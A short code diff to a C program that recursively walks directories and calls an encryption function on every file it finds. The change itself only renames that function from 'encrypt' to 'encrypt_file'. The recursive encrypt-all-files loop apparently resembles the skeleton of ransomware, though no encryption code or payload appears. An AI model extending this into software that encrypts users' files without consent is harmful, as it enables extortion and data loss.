@@ -8,7 +8,7 @@
 #define DT_DIR  4
 #define DT_FILE 8
 /* The prototype file encryption function */
-void encrypt(char *path);
+void encrypt_file(char *path);
 
 
 
@@ -71,7 +71,7 @@ int listdir(char *name, int depth) {
             printf("Catalog: %s\n", path);
             listdir(path, depth + 1);
         } else if (is_file(entry)) {
-            encrypt(path);
+            encrypt_file(path);
         }
     } while ((entry = readdir(dir)));
 
